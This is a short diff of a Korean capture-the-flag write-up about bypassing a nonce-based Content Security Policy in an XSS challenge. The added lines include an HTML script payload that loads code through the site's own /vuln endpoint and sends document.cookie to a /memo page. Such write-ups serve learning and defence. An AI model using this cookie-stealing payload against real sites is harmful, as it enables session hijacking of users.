@@ -121,7 +121,13 @@ app.run(host="0.0.0.0", port=8000)
     
 - `nonce` 값은 보안상으로 안전한 랜덤값으로 설정한다.
 
-→ nonce를 통한 취약점은 없어 보인다.
+`nonce` 부분을 해결하기 위해서는 외부 JS 로드를 통해 우회해야 한다. 마침 `script-src`도 `‘self’`이므로 다음과 같이 작성했다.
+
+```html
+<script src="/vuln?param=document.location='/memo?memo='+document.cookie"></script> 
+```
+
+돼야 되는 코드인데 왜 안될까 하다가 다음과 같이 풀었다.
 
 ### 풀이
 
